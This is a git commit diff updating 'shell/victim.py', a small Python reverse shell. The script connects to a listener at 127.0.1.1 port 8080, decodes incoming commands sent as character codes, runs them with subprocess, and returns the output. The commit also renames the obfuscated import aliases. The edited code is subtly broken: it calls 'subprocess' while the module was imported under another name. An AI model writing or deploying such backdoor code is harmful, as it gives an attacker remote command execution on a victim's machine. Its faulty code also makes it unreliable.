a44192eaca2ba7c4f6b9cb3b5e6404da16e60148
Phoenix <158185295+ZombieGeeK0@users.noreply.github.com>
2024-04-30 11:58:33 +0200

    Update victim.py

--- shell/victim.py
+++ shell/victim.py
@@ -1,16 +1,14 @@
-import sys as ___
-import subprocess as _
-import socket as __
-
+import sys as m1
+import subprocess as m2
+import socket as m3
 H = '127.0.1.1'
 P = 8080
-s = __.socket(__.AF_INET, __.SOCK_STREAM)
+s = m3.socket(m3.AF_INET, m3.SOCK_STREAM)
 s.connect((H, P))
-
 while True:
-    c = s.recv(1024).decode()
-    if c.strip() == "exit":
-        break
-    o = _.___("".join([chr(int(x)) for x in c.split()]))
-    s.send(o.___.encode())
+    d = s.recv(1024).decode()
+    if d.strip() == "exit":break
+    c = "".join([chr(int(x)) for x in d.split()])
+    o = subprocess.getoutput(c)
+    s.send(o.encode())
 s.close()
